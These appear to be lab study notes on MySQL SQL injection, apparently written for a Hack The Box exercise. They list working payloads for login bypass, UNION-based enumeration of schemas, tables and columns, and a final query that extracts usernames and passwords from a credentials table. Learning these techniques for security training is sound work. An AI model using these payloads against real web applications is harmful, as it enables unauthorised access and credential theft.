# SQL Injection

## MySQL
Connection
```
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```
1. Subverting Query Logic
```
' or '1' = '1
```
2. Using Comments
```
' or '1' = '1-- -
admin')-- -
```
3. Union Clause
```
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -

' order by 2-- -
```
4. Database Enumeration
```
SELECT @@version
SELECT POW(1,1) #Only numeric ouputs
SELECT SLEEP(5)

# Information Schema
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- - #Current Database
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - #Table name
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - #Columns
cn' UNION select 1, username, password, 4 from dev.credentials-- - #Data
```
